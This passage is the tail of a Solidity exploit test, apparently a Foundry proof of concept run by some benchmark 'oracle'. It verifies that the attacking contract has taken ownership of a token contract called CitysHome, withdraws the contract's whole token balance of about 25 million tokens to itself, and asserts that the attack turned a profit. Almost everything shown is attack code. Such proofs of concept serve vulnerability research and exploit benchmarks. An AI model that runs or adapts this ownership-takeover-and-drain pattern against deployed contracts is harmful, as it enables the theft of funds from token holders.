        address newOwner = CitysHome(TARGET).owner();
        console.log("New owner:", newOwner);
        require(newOwner == address(this), "Failed to become owner");

        // Calculate how many tokens we can withdraw (contract has 25 million tokens)
        // ownerWithdrew() takes amount in whole tokens (not wei), so we need to divide by 1e18
        uint256 withdrawAmount = contractBalance / 1e18;
        console.log("Withdraw amount (in whole tokens):", withdrawAmount);

        // Withdraw all tokens
        CitysHome(TARGET).ownerWithdrew(withdrawAmount);

        // Check attacker's balance after
        uint256 attackerBalanceAfter = IERC20(TARGET).balanceOf(address(this));
        console.log("Attacker balance after:", attackerBalanceAfter);

        // The oracle will check if attacker balance increased
        // We started with 0, now should have contractBalance
        uint256 finalBalance = IERC20(0x2989997e4f761d9f8Bb9fe668e4cC07a28C5F543).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

